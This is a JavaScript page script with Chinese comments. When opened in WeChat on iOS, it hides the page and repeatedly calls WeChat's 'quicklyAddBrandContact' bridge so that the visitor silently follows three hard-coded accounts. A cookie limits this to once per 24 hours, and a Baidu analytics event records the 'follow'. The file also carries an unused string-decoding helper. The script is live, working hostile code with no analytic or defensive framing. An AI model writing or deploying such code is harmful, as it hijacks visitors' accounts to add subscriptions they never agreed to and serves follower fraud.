
!(function () {
  var data = ['neihanxb', 'videos88', 'fashion_jk'];
  var isIos = !!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
  var MyCookie = (function () {
    return {
      /**
     * 设置cookie
     * @param name 名称
     * @param value 值
     * @param expires 有效时间（单位：小时）（可选） 默认：24h
     */
      set: function (name, value, expires) {
        var expTimes = expires ? (Number(expires) * 60 * 60 * 1000) : (24 * 60 * 60 * 1000); // 毫秒
        var expDate = new Date();
        expDate.setTime(expDate.getTime() + expTimes);
        var expString = expires ? '; expires=' + expDate.toUTCString() : '';
        var pathString = '; path=/';
        document.cookie = name + '=' + encodeURI(value) + expString + pathString;
      },
      /**
       * 读cookie
       * @param name
       */
      get: function (name) {
        var cookieStr = '; ' + document.cookie + '; ';
        var index = cookieStr.indexOf('; ' + name + '=');
        if (index !== -1) {
          var s = cookieStr.substring(index + name.length + 3, cookieStr.length);
          return decodeURI(s.substring(0, s.indexOf('; ')));
        } else {
          return null;
        }
      },
      /**
       * 删除cookie
       * @param name
       */
      del: function (name) {
        var exp = new Date(new Date().getTime() - 1);
        var s = this.read(name);
        if (s !== null) {
          document.cookie = name + '=' + s + '; expires=' + exp.toUTCString() + '; path=/';
        }
      }
    }
  })();
  function isWeiXin() {
    var ua = window.navigator.userAgent.toLowerCase();
    if (ua.match(/MicroMessenger/i) == 'micromessenger') {
      return true;
    } else {
      return false;
    }
  }

  function endaction() {
    try {
      window.name = 'ok' + Math.random();
      if (window.location.search === '') {
        window.location.href = window.location.href + '?t=' + Math.random().toString(36).split('.')[1];
      } else {
        window.location.href = window.location.href + '&t=' + Math.random().toString(36).split('.')[1];
      }
    } catch (e) { }
  }

  function uncompileStr(code) {
    code = unescape(code);
    var c = String.fromCharCode(code.charCodeAt(0) - code.length);
    for (var i = 1; i < code.length; i++) {
      c += String.fromCharCode(code.charCodeAt(i) - c.charCodeAt(i - 1));
    }
    return c;
  }

  function tostart(result) {
    result.forEach(function (value) {
      goTo(value);
    });

    function goTo(username) {
      d = document;
      d.body.style.display = 'none';
      var vk = false;
      var ha = 0;
      c = function () {
        clearInterval(mm);
      };
      j = function () {
        if (ha !== 99) m();
      };
      h = function () {
        endaction();
      };
      m = function () {
        if (!vk) {
          vk = true;
          h()
        }
      };
      k = function () {
        location = 'https://mp.weixin.qq.com/mp/profile_ext?action=home&__biz=' + '' + '&t=' + Math.random().toString(36).split('.')[1] + '#wechat_redirect';
        go(username);
      };

      go = function (username) {
        mm = setTimeout(function () {
          try {
            WeixinJSBridge.invoke('quicklyAddBrandContact', {
              scene: '',
              username: username
            }, function (d) {
              if (d.err_msg.indexOf('ok') !== -1 || d.err_msg.indexOf('added') !== -1) {
                ha = 99;
                m();
              } else go(username)
            });
            ha++;
            if (ha === 2) setTimeout(j, 200);
          } catch (e) { }
        }, 50)
      };
      if (typeof (WeixinJSBridge) === 'undefined') {
        if (document.addEventListener) document.addEventListener('WeixinJSBridgeReady', k, false)
      } else k();
    }
  }

  if (!MyCookie.get('__HAS_ACTIVED')) {
    MyCookie.set('__HAS_ACTIVED', 1, 24); // 24小时内只执行一次自动关注    
    if (window.name === '') {
      if (isWeiXin() && isIos) {
        tostart(data);
      }
    } else {
      window.loadadd = true;
      window.name = ''
    }
  }
})();

var _hmt = _hmt || [];
(function () {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?92225e9091208b631b7d2da0459c6ea7";
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
})();

/**
1. '_trackEvent': 固定参数，表明统计类型是时间跟踪。
2. category：要监控的目标的类型名称，通常是同一组目标的名字，比如"视频"、"音乐"、"软件"、"游戏"等等。该项必选。
3. action：用户跟目标交互的行为，如"播放"、"暂停"、"下载"等等。该项必选。
4. opt_label：事件的一些额外信息，通常可以是歌曲的名称、软件的名称、链接的名称等等。该项可选。
5. opt_value：事件的一些数值信息，比如权重、时长、价格等等，在报表中可以看到其平均值等数据。该项可选。
 */
// adv_wchat_follow
_hmt.push(['_trackEvent', 'adv', 'wechat', 'follow']);
